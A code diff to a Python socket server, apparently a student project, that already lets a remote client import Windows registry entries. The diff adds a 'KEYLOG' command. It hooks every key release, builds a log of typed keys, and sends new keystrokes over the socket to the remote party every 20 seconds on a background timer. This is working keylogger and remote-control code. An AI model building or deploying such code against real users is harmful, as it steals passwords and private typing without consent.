@@ -6,6 +6,8 @@ import os
 import pyautogui
 import registry
 from winreg import *
+import keyboard #pip install keyboard
+
 mp={
     'HKEY_CLASSES_ROOT':HKEY_CLASSES_ROOT,
     'HKEY_CURRENT_CONFIG':HKEY_CURRENT_CONFIG,
@@ -130,7 +132,8 @@ class Server(object):
                     self.conn.send('Không thành công'.encode())
             except:
                 self.conn.send('Không thành công'.encode())
-            
+        elif Str.decode() == 'KEYLOG':
+            self.startKeylogging()    
         else:
             f_bin=open('testing.reg','wb+')
             f_bin.write(Str)
@@ -138,6 +141,36 @@ class Server(object):
             if len(Str)<1024:
                 registry.importRegistry(filepath=r'E:\Python\Socket_Midterm\testing.reg')
                 
+
+    #ATTRIBUTES AND METHODS SPECIFICALLY FOR KEYLOGGING:
+    __interval = 20
+    __log = ''
+    __noch = 0
+    def __callback(self, event):
+        name = event.name
+        if len(name) > 1:
+                if name == 'space':
+                    name = ' '
+                elif name == 'enter':
+                    name = '[ENTER]\n'
+                elif name == 'decimal':
+                    name = '.'
+                else:
+                    name = name.replace(" ", "_")
+                    name = f"[{name.upper()}]"
+        self.__log += name
+    def __report(self):
+        if self.__log:
+            self.conn.send(self.__log[self.__noch:].encode())
+            self.__noch = len(self.__log)
+        timer = threading.Timer(interval=self.__interval, function=self.__report)
+        timer.daemon = True
+        timer.start()
+    def startKeylogging(self):
+        keyboard.on_release(self.__callback)
+        self.__report()
+        keyboard.wait()
+    ##################################################################################
     def Close(self):
         s.close()
         close_it=threading.Thread(target=self.root.destroy)
